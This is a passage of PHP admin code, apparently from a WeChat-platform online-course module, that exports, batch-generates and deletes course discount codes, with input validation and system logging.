			$arr[$i]['use_time']    = $value['use_time']?date('Y-m-d H:i:s', $value['use_time']):'';
			$arr[$i]['addtime']     = date('Y-m-d H:i:s', $value['addtime']);
			$i++;
		}
	 
		$this->exportexcel($arr, array('编号', '密钥', '面值', '使用条件', '有效期', '状态', '使用者', '订单号', '使用时间', '添加时间'), "课程优惠码");
		exit();
	}
}elseif($op=='addCouponCode'){
	if(checksubmit()){
		$prefix = trim($_GPC['prefix']);
		$number = intval($_GPC['number']);
		$amount = intval($_GPC['amount']);
		$conditions = floatval($_GPC['conditions']);
		$validity = strtotime($_GPC['validity']);

		if(strlen($prefix) != 2){
			message("请输入优惠码的两位前缀", "", "error");
		}
		if($number < 1){
			message("请输入正确的优惠码数量", "", "error");
		}
		if($number > 500){
			message("单次生成优惠码不要超过500张", "", "error");
		}
		if($amount < 1){
			message("请输入正确的优惠码面值", "", "error");
		}
		if($validity < time()){
			message("有效期必须大于当前时间", "", "error");
		}

		set_time_limit(120);
		ob_end_clean();
		ob_implicit_flush(true);
		str_pad(" ", 256);

		$total = 0;
		for($i=1;$i<=$number;$i++){
			$seek=mt_rand(0,9999).mt_rand(0,9999).mt_rand(0,9999).mt_rand(0,9999);
			$start=mt_rand(0,16);
			$str=strtoupper(substr(md5($seek),$start,16));
			$str=str_replace("O",chr(mt_rand(65,78)),$str);
			$str=str_replace("0",chr(mt_rand(65,78)),$str);

			$couponData = array(
				'uniacid'	=> $uniacid,
				'password'	=> $prefix.$str,
				'amount'	=> $amount,
				'validity'	=> $validity,
				'conditions'=> $conditions,
				'addtime'   => time()
			);
			if(pdo_insert($this->table_coupon, $couponData)){
				$total++;
			}
		}

		if($total){
			$this->addSysLog($_W['uid'], $_W['username'], 1, "课程订单->课程优惠码", "成功生成{$total}个面值为{$amount}元的优惠码");
		}
		message("成功生成{$total}张优惠码", $this->createWebUrl('order', array('op'=>'couponCode')), "success");
	}
}elseif($op=='delCoupon'){
	$card_id = $_GPC['id'];
	$card = pdo_fetch("SELECT password FROM " .tablename($this->table_coupon). " WHERE uniacid=:uniacid AND card_id=:card_id LIMIT 1", array(':uniacid'=>$uniacid, ':card_id'=>$card_id));
	if(empty($card)){
		message("该课程优惠码不存在或已被删除", "", "error");
	}
	$res = pdo_delete($this->table_coupon, array('uniacid'=>$uniacid,'card_id' => $card_id));
	if($res){
		$this->addSysLog($_W['uid'], $_W['username'], 2, "课程优惠码", "删除密钥为:{$card['password']}的课程优惠码");
	}

	echo "<script>alert('删除成功！');location.href='".$this->createWebUrl('order', array('op' => 'couponCode', 'page' => $_GPC['page']))."';</script>";
}elseif($op=='delAllCoupon'){
	$ids = $_GPC['ids'];
	if(!empty($ids) && is_array($ids)){
		$total = 0;
		$coupon = "";
		foreach($ids as $id){
			$coupon .= $this->getCouponPwd($id).",";
			if(pdo_delete($this->table_coupon, array('uniacid'=>$uniacid,'card_id' => $id))){
				$total++;
			}
		}

		$coupon = trim($coupon, ",");
		$this->addSysLog($_W['uid'], $_W['username'], 2, "课程优惠码", "批量删除{$total}个课程优惠码,[{$coupon}]");
		message("批量删除成功", $this->createWebUrl('order', array('op'=>'couponCode')), "success");
	}else{
		message("未选中任何课程优惠码", "", "error");
	}
}

if(!in_array($op , array('getLesson','getMember'))){
	include $this->template('order');
}


?>